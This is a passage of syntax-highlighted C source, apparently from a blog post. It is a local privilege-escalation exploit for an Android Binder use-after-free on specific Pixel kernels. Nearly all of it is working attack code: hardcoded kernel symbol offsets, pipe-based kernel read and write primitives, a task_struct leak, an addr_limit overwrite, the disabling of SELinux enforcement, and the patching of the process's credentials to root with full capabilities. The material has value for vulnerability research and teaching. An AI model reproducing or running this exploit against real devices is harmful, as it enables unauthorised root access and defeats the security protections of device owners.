&#123;</span></span><br><span class="line">    u32 osid;              <span class="comment">/*  u32                         0       4   */</span></span><br><span class="line">    u32 sid;               <span class="comment">/*  u32                         4       4   */</span></span><br><span class="line">    u32 exec_sid;          <span class="comment">/*  u32                         8       4   */</span></span><br><span class="line">    u32 create_sid;        <span class="comment">/*  u32                         12      4   */</span></span><br><span class="line">    u32 keycreate_sid;     <span class="comment">/*  u32                         16      4   */</span></span><br><span class="line">    u32 sockcreate_sid;    <span class="comment">/*  u32                         20      4   */</span></span><br><span class="line">&#125; __attribute__((packed)); <span class="comment">/* size: 24 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Kernel symbol table offsets, relative to _head, in the QP1A.190711.020</span></span><br><span class="line"><span class="comment"> * walleye/taimen kernel. The SELinux-related offsets were determined with</span></span><br><span class="line"><span class="comment"> * reference to System.map and a minor bit of trial-and-error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">ptrdiff_t</span> ksym_init_task = <span class="number">0x20257d0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">ptrdiff_t</span> ksym_init_user_ns = <span class="number">0x202f2c8</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">ptrdiff_t</span> ksym_selinux_enabled = <span class="number">0x2063780</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">ptrdiff_t</span> ksym_selinux_enforcing = <span class="number">0x23ce4a8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The exploit relies upon a use-after-free by the kernel&#x27;s epoll cleanup code</span></span><br><span class="line"><span class="comment"> * resulting from an oversight in Android&#x27;s Binder IPC subsystem, fixed here:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In the original Project Zero POC, arrays of 25 `struct iovec`s are treated</span></span><br><span class="line"><span class="comment"> * as `struct binder_thread`s by the kernel. We do the same here via a union,</span></span><br><span class="line"><span class="comment"> * which hopefully clarifies where the #defines of 25 and 10 came from in the</span></span><br><span class="line"><span class="comment"> * original POC. Since we&#x27;re using structure definitions for offsets only, we&#x27;re</span></span><br><span class="line"><span class="comment"> * fine cutting off 8 bytes from our definition of a `struct binder_thread` to</span></span><br><span class="line"><span class="comment"> * ensure `sizeof(binder_iovecs) == sizeof(struct iovec[25]) == 400`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> iovs_sz = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> binder_thread) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iovec);</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> iov_idx = offsetof(<span class="keyword">struct</span> binder_thread, wait) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iovec);</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_thread</span> <span class="title">bt</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovs</span>[<span class="title">iovs_sz</span>];</span></span><br><span class="line">&#125; binder_iovecs;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kwrite</span><span class="params">(u64 kaddr, <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kread</span><span class="params">(u64 kaddr, <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kwrite_u64</span><span class="params">(u64 kaddr, u64 data)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kwrite_u32</span><span class="params">(u64 kaddr, u32 data)</span>;</span><br><span class="line">u64 <span class="title function_">kread_u64</span><span class="params">(u64 kaddr)</span>;</span><br><span class="line">u64 <span class="title function_">kread_u32</span><span class="params">(u64 kaddr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_globals</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">find_current</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">obtain_kernel_rw</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">find_kernel_base</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">patch_creds</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_debug_console</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">con_loop</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">con_consume</span><span class="params">(<span class="type">char</span> **token)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">con_parse_hexstring</span><span class="params">(<span class="type">char</span> *token, u64 *val)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">con_parse_number</span><span class="params">(<span class="type">char</span> *token, u64 *val)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">con_parse_hexbytes</span><span class="params">(<span class="type">char</span> **token, u8 **data, <span class="type">size_t</span> *len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">con_kdump</span><span class="params">(u64 kaddr, <span class="type">size_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_stage</span><span class="params">(<span class="type">int</span> op)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notify_stage_failure</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">int</span> debugging;</span><br><span class="line"><span class="type">void</span> *dummy_page;</span><br><span class="line"><span class="type">int</span> kernel_rw_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> binder_fd;</span><br><span class="line"><span class="type">int</span> epoll_fd;</span><br><span class="line"></span><br><span class="line">u64 current;</span><br><span class="line">u64 kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kwrite</span><span class="params">(u64 kaddr, <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; PAGE_SIZE)</span><br><span class="line">        errx(<span class="number">1</span>, <span class="string">&quot;kernel writes over PAGE_SIZE are messy, tried 0x%lx&quot;</span>, len);</span><br><span class="line">    <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], buf, len) != (<span class="type">ssize_t</span>)len)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;kwrite failed to load userspace buffer&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], (<span class="type">void</span> *)kaddr, len) != (<span class="type">ssize_t</span>)len)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;kwrite failed to overwrite kernel memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kread</span><span class="params">(u64 kaddr, <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; PAGE_SIZE)</span><br><span class="line">        errx(<span class="number">1</span>, <span class="string">&quot;kernel reads over PAGE_SIZE are messy, tried 0x%lx&quot;</span>, len);</span><br><span class="line">    <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], (<span class="type">void</span> *)kaddr, len) != (<span class="type">ssize_t</span>)len)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;kread failed to read kernel memory&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], buf, len) != (<span class="type">ssize_t</span>)len)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;kread failed to write out to userspace&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">u64 <span class="title function_">kread_u64</span><span class="params">(u64 kaddr)</span> &#123;</span><br><span class="line">    u64 data;</span><br><span class="line">    kread(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line">u64 <span class="title function_">kread_u32</span><span class="params">(u64 kaddr)</span> &#123;</span><br><span class="line">    u32 data;</span><br><span class="line">    kread(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kwrite_u64</span><span class="params">(u64 kaddr, u64 data)</span> &#123;</span><br><span class="line">    kwrite(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kwrite_u32</span><span class="params">(u64 kaddr, u32 data)</span> &#123;</span><br><span class="line">    kwrite(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_globals</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pid = getpid();</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">utsname</span> <span class="title">kernel_info</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (uname(&amp;kernel_info) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;determine kernel release&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kernel_info.release, <span class="string">&quot;4.4.177-g83bee1dc48e8&quot;</span>))</span><br><span class="line">        warnx(<span class="string">&quot;kernel version-BuildID is not &#x27;4.4.177-g83bee1dc48e8&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dummy_page = mmap((<span class="type">void</span> *)<span class="number">0x100000000</span>ul, <span class="number">2</span> * PAGE_SIZE,</span><br><span class="line">                      PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (dummy_page != (<span class="type">void</span> *)<span class="number">0x100000000</span>ul)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mmap 4g aligned&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(kernel_rw_pipe))</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;kernel_rw_pipe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    binder_fd = open(<span class="string">&quot;/dev/binder&quot;</span>, O_RDONLY);</span><br><span class="line">    epoll_fd = epoll_create(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">find_current</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* Originally: void leak_task_struct(void); */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123;.events = EPOLLIN&#125;;</span><br><span class="line">    <span class="keyword">if</span> (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &amp;event))</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;epoll_add&quot;</span>);</span><br><span class="line"></span><br><span class="line">    binder_iovecs bio;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;bio, <span class="number">0</span>, <span class="keyword">sizeof</span>(bio));</span><br><span class="line">    bio.iovs[iov_idx].iov_base = dummy_page;             <span class="comment">/* spinlock in the low address half must be zero */</span></span><br><span class="line">    bio.iovs[iov_idx].iov_len = PAGE_SIZE;               <span class="comment">/* wq-&gt;task_list-&gt;next */</span></span><br><span class="line">    bio.iovs[iov_idx + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xdeadbeef</span>; <span class="comment">/* wq-&gt;task_list-&gt;prev */</span></span><br><span class="line">    bio.iovs[iov_idx + <span class="number">1</span>].iov_len = PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_fd))</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fcntl(pipe_fd[<span class="number">0</span>], F_SETPIPE_SZ, PAGE_SIZE) != PAGE_SIZE)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;pipe size&quot;</span>);</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> page_buffer[PAGE_SIZE];</span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* Child process */</span></span><br><span class="line">        prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class="line">        <span class="comment">// first page: dummy data</span></span><br><span class="line">        <span class="keyword">if</span> (read(pipe_fd[<span class="number">0</span>], page_buffer, PAGE_SIZE) != PAGE_SIZE)</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;read full pipe&quot;</span>);</span><br><span class="line">        close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(binder_fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">ssize_t</span> writev_ret = writev(pipe_fd[<span class="number">1</span>], bio.iovs, iovs_sz);</span><br><span class="line">    <span class="keyword">if</span> (writev_ret != (<span class="type">ssize_t</span>)(<span class="number">2</span> * PAGE_SIZE))</span><br><span class="line">        errx(<span class="number">1</span>, <span class="string">&quot;writev() returns 0x%lx, expected 0x%lx\n&quot;</span>,</span><br><span class="line">             writev_ret, (<span class="type">ssize_t</span>)(<span class="number">2</span> * PAGE_SIZE));</span><br><span class="line">    <span class="comment">// second page: leaked data</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_fd[<span class="number">0</span>], page_buffer, PAGE_SIZE) != PAGE_SIZE)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read full pipe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> status;</span><br><span class="line">    <span class="keyword">if</span> (wait(&amp;status) != pid)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;wait&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current = *(u64 *)(page_buffer + <span class="number">0xe8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">obtain_kernel_rw</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* Originally: void clobber_addr_limit(void); */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123;.events = EPOLLIN&#125;;</span><br><span class="line">    <span class="keyword">if</span> (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &amp;event))</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;epoll_add&quot;</span>);</span><br><span class="line"></span><br><span class="line">    binder_iovecs bio;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;bio, <span class="number">0</span>, <span class="keyword">sizeof</span>(bio));</span><br><span class="line">    bio.iovs[iov_idx].iov_base = dummy_page;             <span class="comment">/* spinlock in the low address half must be zero */</span></span><br><span class="line">    bio.iovs[iov_idx].iov_len = <span class="number">1</span>;                       <span class="comment">/* wq-&gt;task_list-&gt;next */</span></span><br><span class="line">    bio.iovs[iov_idx + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xdeadbeef</span>; <span class="comment">/* wq-&gt;task_list-&gt;prev */</span></span><br><span class="line">    bio.iovs[iov_idx + <span class="number">1</span>].iov_len = <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>;      <span class="comment">/* iov_len of previous, then this element and next element */</span></span><br><span class="line">    bio.iovs[iov_idx + <span class="number">2</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xbeefdead</span>;</span><br><span class="line">    bio.iovs[iov_idx + <span class="number">2</span>].iov_len = <span class="number">8</span>; <span class="comment">/* should be correct from the start, kernel will sum up lengths when importing */</span></span><br><span class="line"></span><br><span class="line">    u64 second_write_chunk[] = &#123;</span><br><span class="line">        <span class="number">1</span>,                 <span class="comment">/* iov_len */</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>,        <span class="comment">/* iov_base (already used) */</span></span><br><span class="line">        <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>,    <span class="comment">/* iov_len (already used) */</span></span><br><span class="line">        current + <span class="number">0x8</span>,     <span class="comment">/* next iov_base (addr_limit) */</span></span><br><span class="line">        <span class="number">8</span>,                 <span class="comment">/* next iov_len (sizeof(addr_limit)) */</span></span><br><span class="line">        <span class="number">0xfffffffffffffffe</span> <span class="comment">/* value to write */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socks))</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (write(socks[<span class="number">1</span>], <span class="string">&quot;X&quot;</span>, <span class="number">1</span>) != <span class="number">1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write socket dummy byte&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* Child process */</span></span><br><span class="line">        prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class="line">        <span class="type">size_t</span> write_sz = <span class="keyword">sizeof</span>(second_write_chunk);</span><br><span class="line">        <span class="keyword">if</span> (write(socks[<span class="number">1</span>], second_write_chunk, write_sz) != (<span class="type">ssize_t</span>)write_sz)</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;write second chunk to socket&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(binder_fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;.msg_iov = bio.iovs, .msg_iovlen = iovs_sz&#125;;</span><br><span class="line">    <span class="type">size_t</span> recvmsg_sz = bio.iovs[iov_idx].iov_len +</span><br><span class="line">                        bio.iovs[iov_idx + <span class="number">1</span>].iov_len +</span><br><span class="line">                        bio.iovs[iov_idx + <span class="number">2</span>].iov_len;</span><br><span class="line">    <span class="type">ssize_t</span> recvmsg_ret = recvmsg(socks[<span class="number">0</span>], &amp;msg, MSG_WAITALL);</span><br><span class="line">    <span class="keyword">if</span> (recvmsg_ret != (<span class="type">ssize_t</span>)recvmsg_sz)</span><br><span class="line">        errx(<span class="number">1</span>, <span class="string">&quot;recvmsg() returns %ld, expected %lu\n&quot;</span>, recvmsg_ret, recvmsg_sz);</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">find_kernel_base</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    u64 current_mm = kread_u64(current + offsetof(<span class="keyword">struct</span> task_struct, mm));</span><br><span class="line">    u64 current_user_ns = kread_u64(current_mm + offsetof(<span class="keyword">struct</span> mm_struct, user_ns));</span><br><span class="line">    kernel_base = current_user_ns - ksym_init_user_ns;</span><br><span class="line">    <span class="keyword">if</span> (kernel_base &amp; <span class="number">0xfff</span>ul) &#123;</span><br><span class="line">        <span class="keyword">if</span> (debugging) &#123;</span><br><span class="line">            warnx(<span class="string">&quot;bad kernel base (not 0x...000)&quot;</span>);</span><br><span class="line">            kernel_base = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            errx(<span class="number">1</span>, <span class="string">&quot;bad kernel base (not 0x...000)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 init_task = kernel_base + ksym_init_task;</span><br><span class="line">    u64 cred_ptrs[<span class="number">2</span>] = &#123;</span><br><span class="line">        kread_u64(init_task + offsetof(<span class="keyword">struct</span> task_struct, real_cred)), <span class="comment">/* init_task.real_cred */</span></span><br><span class="line">        kread_u64(init_task + offsetof(<span class="keyword">struct</span> task_struct, cred)),      <span class="comment">/* init_task.cred */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Examine what we think are the init process&#x27; credentials.</span></span><br><span class="line"><span class="comment">     * Presumably, these tests are unlikely to pass unless we have the right</span></span><br><span class="line"><span class="comment">     * kernel base, kernel symbol offsets, and kernel data structure offsets.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> cred_idx = <span class="number">0</span>; cred_idx &lt; <span class="number">2</span>; cred_idx++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">cred</span>;</span></span><br><span class="line">        kread(cred_ptrs[cred_idx], &amp;cred, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cred.uid || cred.gid || cred.suid || cred.sgid ||</span><br><span class="line">            cred.euid || cred.egid || cred.fsuid || cred.fsgid) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debugging) &#123;</span><br><span class="line">                warnx(<span class="string">&quot;bad kernel base (init_task not where expected)&quot;</span>);</span><br><span class="line">                kernel_base = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                errx(<span class="number">1</span>, <span class="string">&quot;bad kernel base (init_task not where expected)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">const</span> u64 cap = <span class="number">0x3fffffffff</span>;</span><br><span class="line">        <span class="keyword">if</span> (cred.cap_inheritable || cred.cap_permitted != cap ||</span><br><span class="line">            cred.cap_effective != cap || cred.cap_bset != cap ||</span><br><span class="line">            cred.cap_ambient) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debugging) &#123;</span><br><span class="line">                warnx(<span class="string">&quot;bad kernel base (init_task not where expected)&quot;</span>);</span><br><span class="line">                kernel_base = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                errx(<span class="number">1</span>, <span class="string">&quot;bad kernel base (init_task not where expected)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* .real_cred == .cred, probably. */</span></span><br><span class="line">        <span class="keyword">if</span> (cred_ptrs[<span class="number">0</span>] == cred_ptrs[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">patch_creds</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    u64 cred_ptrs[<span class="number">2</span>] = &#123;</span><br><span class="line">        kread_u64(current + offsetof(<span class="keyword">struct</span> task_struct, real_cred)), <span class="comment">/* current-&gt;real_cred */</span></span><br><span class="line">        kread_u64(current + offsetof(<span class="keyword">struct</span> task_struct, cred)),      <span class="comment">/* current-&gt;cred */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Final check: our struct cred(s?) in the kernel should contain our uid. */</span></span><br><span class="line">    <span class="keyword">if</span> (kread_u32(cred_ptrs[<span class="number">0</span>] + offsetof(<span class="keyword">struct</span> cred, uid)) != getuid())</span><br><span class="line">        errx(<span class="number">1</span>, <span class="string">&quot;bad cred (current-&gt;real_cred-&gt;uid not our own uid)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cred_ptrs[<span class="number">0</span>] != cred_ptrs[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> (kread_u32(cred_ptrs[<span class="number">1</span>] + offsetof(<span class="keyword">struct</span> cred, uid)) != getuid())</span><br><span class="line">            errx(<span class="number">1</span>, <span class="string">&quot;bad cred (current-&gt;cred-&gt;uid not our own uid)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Just disabling selinux_enforcing should suffice for our purposes. SELinux</span></span><br><span class="line"><span class="comment">     * still does MAC (mandatory access control) checks on our actions based on</span></span><br><span class="line"><span class="comment">     * our security contexts, but violations are logged, not prevented. Our</span></span><br><span class="line"><span class="comment">     * permissions then fall back to DAC (discretionary access control), i.e.</span></span><br><span class="line"><span class="comment">     * user accounts/groups. And as we know, the root user is DAC omnipotent.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// kwrite_u32(kernel_base + ksym_selinux_enabled, 0);</span></span><br><span class="line">    kwrite_u32(kernel_base + ksym_selinux_enforcing, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Patch our struct cred(s?) in the kernel. */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> cred_idx = <span class="number">0</span>; cred_idx &lt; <span class="number">2</span>; cred_idx++) &#123;</span><br><span class="line">        u64 cred_ptr = cred_ptrs[cred_idx];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* All 8 (e|f?s)?[ug]id members should be set to 0, making us root. */</span></span><br><span class="line">        kwrite_u32(cred_ptr + offsetof(<span class="keyword">struct</span> cred, uid), <span class="number">0</span>);</span><br><span class="line">        kwrite_u32(cred_ptr + offsetof(<span class="keyword">struct</span> cred, gid), <span class="number">0</span>);</span><br><span class="line">        kwrite_u32(cred_ptr + offsetof(<span class="keyword">struct</span> cred, suid), <span class="number">0</span>);</span><br><span class="line">        kwrite_u32(cred_ptr + offsetof(<span class="keyword">struct</span> cred, sgid), <span class="number">0</span>);</span><br><span class="line">        kwrite_u32(cred_ptr + offsetof(<span class="keyword">struct</span> cred, euid), <span class="number">0</span>);</span><br><span class="line">        kwrite_u32(cred_ptr + offsetof(<span class="keyword">struct</span> cred, egid), <span class="number">0</span>);</span><br><span class="line">        kwrite_u32(cred_ptr + offsetof(<span class="keyword">struct</span> cred, fsuid), <span class="number">0</span>);</span><br><span class="line">        kwrite_u32(cred_ptr + offsetof(<span class="keyword">struct</span> cred, fsgid), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* What to do with securebits is not as obvious. The comment for it in</span></span><br><span class="line"><span class="comment">         * the kernel source reads &#x27;SUID-less security management&#x27;. In the init</span></span><br><span class="line"><span class="comment">         * process&#x27; cred(s?), this is set to 0, so we might as well do the same.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        kwrite_u32(cred_ptr + offsetof(<span class="keyword">struct</span> cred, securebits), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* All 5 cap_.+ members should be bitset to all 1&#x27;s. We will have all</span></span><br><span class="line"><span class="comment">         * capability bits set, and our children will be able to inherit them.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        kwrite_u64(cred_ptr + offsetof(<span class="keyword">struct</span> cred, cap_inheritable), ~(u64)<span class="number">0</span>);</span><br><span class="line">        kwrite_u64(cred_ptr + offsetof(<span class="keyword">struct</span> cred, cap_permitted), ~(u64)<span class="number">0</span>);</span><br><span class="line">        kwrite_u64(cred_ptr + offsetof(<span class="keyword">struct</span> cred, cap_effective), ~(u64)<span class="number">0</span>);</span><br><span class="line">        kwrite_u64(cred_ptr + offsetof(<span class="keyword">struct</span> cred, cap_bset), ~(u64)<span class="number">0</span>);</span><br><span class="line">        